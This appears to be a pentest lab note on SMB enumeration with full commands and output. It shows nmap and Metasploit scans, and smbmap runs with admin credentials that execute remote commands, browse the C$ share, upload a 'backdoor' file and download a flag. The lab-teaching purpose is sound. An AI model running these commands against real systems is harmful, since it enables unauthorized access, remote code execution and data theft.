# SMB

SMB (Server Message Block) is a protocol used for sharing files, printers, and other resources between devices on a network. It is commonly used in Windows operating systems and allows for easy file sharing between computers. The default port for SMB is 445, but it can also use port 139. However, due to security concerns, it's recommended to use SMB over VPN or with encryption enabled to prevent unauthorized access to shared resources.

## smbmap

smbmap is a command-line tool used for enumerating and interacting with SMB shares on Windows and Linux systems. It allows users to quickly scan for open SMB shares, list the available files and directories, and even execute commands on the remote system.

Here is how we can use smbmap on a network:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -d . -H 10.5.20.115
[+] IP: 10.5.20.115:445	Name: 10.5.20.115                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	READ, WRITE	Remote Admin
	C                                                 	READ ONLY	
	C$                                                	READ, WRITE	Default share
	D$                                                	READ, WRITE	Default share
	Documents                                         	READ ONLY	
	Downloads                                         	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	print$                                            	READ, WRITE	Printer Drivers
```

We can also do command execution using this command:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -H 10.5.20.115 -x "ipconfig"
                                
Windows IP Configuration


Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . : ap-south-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::447d:2419:7782:5b26%22
   IPv4 Address. . . . . . . . . . . : 10.5.20.115
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 10.5.16.1

Tunnel adapter isatap.ap-south-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : ap-south-1.compute.internal
```

`-L` - List all drives on the specified host, requires ADMIN rights. Example:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -H 10.5.20.115 -L           
[+] Host 10.5.20.115 Local Drives: C:\ D:\
[+] Host 10.5.20.115 Net Drive(s):
	No mapped network drives
```

In this case, no mapped network drives were found.

We can connect a drive, such as C drive, by using the following command:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -H 10.5.20.115 -r 'C$'
[+] IP: 10.5.20.115:445	Name: 10.5.20.115                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	C$                                                	READ, WRITE	
	.\C$\*
	dr--r--r--                0 Sat Sep  5 13:26:00 2020	$Recycle.Bin
	fw--w--w--           398356 Wed Aug 12 10:47:41 2020	bootmgr
	fr--r--r--                1 Wed Aug 12 10:47:40 2020	BOOTNXT
	dr--r--r--                0 Wed Aug 12 10:47:41 2020	Documents and Settings
	fr--r--r--               32 Mon Dec 21 21:27:10 2020	flag.txt
	fr--r--r--       8589934592 Wed Dec 27 20:31:32 2023	pagefile.sys
	dr--r--r--                0 Wed Aug 12 10:49:32 2020	PerfLogs
	dw--w--w--                0 Wed Aug 12 10:49:32 2020	Program Files
	dr--r--r--                0 Sat Sep  5 14:35:45 2020	Program Files (x86)
	dr--r--r--                0 Sat Sep  5 14:35:45 2020	ProgramData
	dr--r--r--                0 Sat Sep  5 09:16:57 2020	System Volume Information
	dw--w--w--                0 Sat Dec 19 11:14:55 2020	Users
	dr--r--r--                0 Wed Dec 27 20:53:23 2023	Windows
```

We can also upload a backdoor from our system to the target system:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -H 10.5.20.115 --upload '/root/backdoor' 'C$\backdoor'
[+] Starting upload: /root/backdoor (0 bytes)
[+] Upload complete
```

We can read the file like this:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -H 10.5.20.115 -r 'C$' -x 'type flag.txt'
```

We can also download the file like this:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -H 10.5.20.115 --download 'C$\flag.txt'      
[+] Starting download: C$\flag.txt (32 bytes)
[+] File output to: /root/10.5.20.115-C_flag.txt
```

## SMB: Samba 1

Here we can see SMB is running on both TCP ports:

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# nmap -T4 192.251.29.3 -sV
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-27 15:46 UTC
Nmap scan report for target-1 (192.251.29.3)
Host is up (0.0000090s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE     VERSION
<strong>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
</strong><strong>445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
</strong>MAC Address: 02:42:C0:FB:1D:03 (Unknown)
Service Info: Host: SAMBA-RECON

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds
</code></pre>

But we forgot about UDP ports, they are also essential to enumerate, as you can see follow:

```
root@attackdefense:~# nmap -T4 192.251.29.3 -sU --top-port 25 -sV --open
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-27 15:51 UTC
Nmap scan report for target-1 (192.251.29.3)
Host is up (0.000055s latency).
Not shown: 13 closed ports
PORT      STATE         SERVICE      VERSION
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
111/udp   open|filtered rpcbind
123/udp   open|filtered ntp
137/udp   open          netbios-ns   Samba nmbd netbios-ns (workgroup: RECONLABS)
138/udp   open|filtered netbios-dgm
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
631/udp   open|filtered ipp
49154/udp open|filtered unknown
MAC Address: 02:42:C0:FB:1D:03 (Unknown)
Service Info: Host: SAMBA-RECON

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.22 seconds
```

We can also utilize nmap scripts to further enumerate the port:

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# nmap 192.251.29.3 -p445 --script=smb-os-discovery
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-27 15:55 UTC
Nmap scan report for target-1 (192.251.29.3)
Host is up (0.000037s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:FB:1D:03 (Unknown)

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: victim-1
<strong>|   NetBIOS computer name: SAMBA-RECON\x00
</strong>|   Domain name: \x00
|   FQDN: victim-1
|_  System time: 2023-12-27T15:55:53+00:00

Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds
</code></pre>

Here we can also see the NetBIOS computer name.

We can also use metasploit-framework for the SMB enumeration, here is an example:

```sh
msf5 > use auxiliary/scanner/smb/smb_version 
msf5 auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      yes       The target address range or CIDR identifier
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/smb_version) > set rhosts 192.251.29.3
rhosts => 192.251.29.3
msf5 auxiliary(scanner/smb/smb_version) > run

[*] 192.251.29.3:445      - Host could not be identified: Windows 6.1 (Samba 4.3.11-Ubuntu)
[*] 192.251.29.3:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
